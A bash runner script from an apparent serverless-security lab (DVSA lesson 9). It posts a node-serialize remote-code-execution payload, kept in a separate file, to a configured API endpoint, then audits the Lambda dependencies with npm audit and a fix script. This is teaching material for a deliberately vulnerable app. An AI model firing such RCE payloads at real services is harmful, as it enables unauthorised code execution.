#!/bin/bash
# =============================================================
# Lesson 9 - Vulnerable Dependency (node-serialize) RCE runner.
# Same wire attack as Lesson 1. Plus: run npm audit against a
# local copy of the Lambda source to prove the CVE is listed.
#
# Usage:
#   export API="https://YOUR-API-ID.execute-api.us-east-1.amazonaws.com/Stage/order"
#   # optional: export LAMBDA_SRC="/path/to/DVSA-ORDER-MANAGER"
#   bash run.sh
# =============================================================
set -u

HERE="$(cd "$(dirname "$0")" && pwd)"
PAYLOAD="$HERE/payload.json"

if [ -z "${API:-}" ]; then
  echo "ERROR: set API env var first." >&2
  exit 1
fi

echo "============================================"
echo " Lesson 9: Vulnerable Dependency (node-serialize)"
echo "============================================"

echo "[1/2] Firing the RCE payload (same wire attack as Lesson 1)..."
RESPONSE=$(curl -s -X POST "$API" \
  -H "Content-Type: application/json" \
  --data "$(python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); d.pop("_comment",None); print(json.dumps(d))' "$PAYLOAD")")
echo "[*] Response: $RESPONSE"
echo ""
echo "[2/2] Auditing local copy of the Lambda source (if provided)..."
if [ -n "${LAMBDA_SRC:-}" ] && [ -f "$LAMBDA_SRC/package.json" ]; then
  ( cd "$LAMBDA_SRC" && npm audit --production || true )
  echo ""
  python3 "$HERE/fix.py" "$LAMBDA_SRC/package.json" || true
else
  echo "(skip) Set LAMBDA_SRC=/path/to/DVSA-ORDER-MANAGER to audit package.json."
fi

echo ""
echo "Verify CloudWatch: /aws/lambda/DVSA-ORDER-MANAGER"
echo "  Look for: FILE READ SUCCESS: You are reading the contents of my hacked file!"
